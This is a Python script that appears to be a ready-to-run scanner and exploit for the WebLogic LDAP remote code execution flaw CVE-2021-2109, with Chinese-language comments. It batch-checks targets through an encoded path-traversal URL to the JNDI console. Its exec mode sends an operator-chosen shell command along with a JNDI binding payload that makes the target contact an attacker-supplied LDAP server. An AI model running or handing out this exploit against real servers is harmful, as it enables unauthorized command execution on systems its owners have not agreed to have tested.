'''
Author: your name
Date: 2021-03-22 21:14:34
LastEditTime: 2021-03-22 22:23:09
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \weblogic\Weblogic LDAP 远程代码执行漏洞 CVE-2021-2109.py
'''
import requests
import sys
import json
import os
import sys
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse


class CVE_2021_2109():
  
    
    def title(self):
        print('------------------------------------------')
        print('''[+]存在未授权访问情况下：适用版本：
        WebLogic Server 10.3.6.0.0
        WebLogic Server 12.1.3.0.0
        WebLogic Server 12.2.1.3.0
        WebLogic Server 12.2.1.4.0
        WebLogic Server 14.1.1.0.0 ''')
        print('[+]使用格式: python poc.py -u url -f 1.txt -e')
        print('[+]使用格式: python poc.py -h 获取帮助')
        print('------------------------------------------')

    #漏洞检测
    def poc(self, target_url):
        target_url = target_url + '/console/css/%252e%252e%252f/consolejndi.portal'
        try:
            res = requests.get(url=target_url,verify=False)
            if res.status_code != 404 or 'JNDI 主页' in res.text:
                print(f"\033[31m[!] 目标{target_url}可能存在漏洞 \033[0m")
            else:
                print("\033[31m[x] 目标{target_url}不存在漏洞  \033[0m")
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
     #命令执行
    def exp(self,target_url):
        ldap_url=input('[+]请输入ldap_url>>> ')
        cmd=input('[+]请输入需要执行的命令>>> ')
        headers = {
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
            "cmd": cmd,
            }
        payload=f'/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{ldap_url}/Basic/WeblogicEcho;AdminServer%22)'
        target_url = target_url + payload
        res = requests.get(url=target_url,headers=headers,verify=False)
        print(res.text)
    def main(self, target_url, file, exec):
        self.title()
        if target_url:
            self.poc(target_url)
        if file:
            #读取文件
            for url in args.file:
                #for url in file:
                target_url = url.replace('\n', '')
                self.poc(target_url)
        if exec:
            self.exp(target_url)
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',type=str,default=False,help="单个检测，带上http://")
    parser.add_argument("-f",'--file',type=argparse.FileType('r'),default=False,help="批量检测")
    parser.add_argument("-e", '--exec',action='store_true',help="执行命令,只针对单个url")
    args = parser.parse_args()
    run = CVE_2021_2109()
    run.main(args.url, args.file, args.exec)